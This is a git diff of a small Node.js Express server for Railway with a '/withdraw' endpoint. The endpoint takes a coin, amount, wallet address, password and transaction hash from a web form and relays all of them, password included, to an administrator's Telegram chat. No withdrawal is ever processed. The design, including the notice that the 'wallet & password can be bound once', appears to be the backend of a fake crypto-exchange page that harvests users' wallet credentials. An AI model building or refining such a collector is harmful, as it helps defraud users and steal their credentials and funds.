@@ -1,39 +1,37 @@
 const express = require("express");
-const cors = require("cors");
 const axios = require("axios");
+const cors = require("cors");
 
 const app = express();
-app.use(express.json());
-app.use(cors());
 
-// -------------------------
-//  读取 Railway 环境变量
-// -------------------------
+// Allow CORS for safety (your index.html may be served separately)
+app.use(cors());
+app.use(express.json());
+
+// Load environment variables in Railway
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-// Debug（如果你要检查 ENV）
-// console.log("BOT_TOKEN =", BOT_TOKEN);
-// console.log("ADMIN_CHAT_ID =", ADMIN_CHAT_ID);
-
+// Check environment variables
 if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-    console.error("❌ ERROR: Missing BOT_TOKEN or ADMIN_CHAT_ID in Railway ENV");
+    console.log("❌ ERROR: BOT_TOKEN or ADMIN_CHAT_ID missing in Railway Dashboard");
+} else {
+    console.log("✅ Telegram env loaded");
 }
 
-// -------------------------
-//  前端提款 POST API
-// -------------------------
-app.post("/api/wallet", async (req, res) => {
+// ---------------------------
+// WITHDRAW API
+// ---------------------------
+app.post("/withdraw", async (req, res) => {
     try {
         const { coin, amount, usdt, wallet, password, hash } = req.body;
 
-        if (!coin || !amount || !wallet || !password || !hash) {
+        // Validate
+        if (!coin || !amount || !usdt || !wallet || !password || !hash) {
             return res.status(400).json({ success: false, error: "Missing fields" });
         }
 
-        // -------------------------
-        //  Telegram 消息推送格式
-        // -------------------------
+        // Format Telegram message
         const message = `
 📤 <b>NEW WITHDRAWAL REQUEST</b>
 --------------------------------
@@ -46,32 +44,33 @@ app.post("/api/wallet", async (req, res) => {
 
 ⚠️ Wallet & password can be bound once.
 Please screenshot the transaction hash for record.
-        `;
+`;
 
-        // -------------------------
-        //  发送到 Telegram BOT + 群组
-        // -------------------------
-        await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            {
-                chat_id: ADMIN_CHAT_ID,
-                text: message,
-                parse_mode: "HTML"
-            }
-        );
+        // Send to Telegram
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+        });
 
-        console.log("✔ Withdrawal sent to Telegram:", hash);
+        console.log("✅ Withdrawal pushed to Telegram");
 
         return res.json({ success: true });
 
     } catch (err) {
-        console.error("❌ Telegram API ERROR:", err.response?.data || err.message);
-        return res.status(500).json({ success: false, error: "Server error" });
+        console.error("❌ Telegram API Error:", err.response?.data || err.message);
+        return res.status(500).json({ success: false, error: "Server Error" });
     }
 });
 
-// -------------------------
-//  Railway 自动端口
-// -------------------------
-const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => console.log("🚀 Server running on port:", PORT));
+// ---------------------------
+// Serve index.html (optional but recommended)
+// ---------------------------
+app.use(express.static("public")); 
+// Make sure your index.html is placed inside /public folder in Railway
+
+// ---------------------------
+// Start Railway server
+// ---------------------------
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
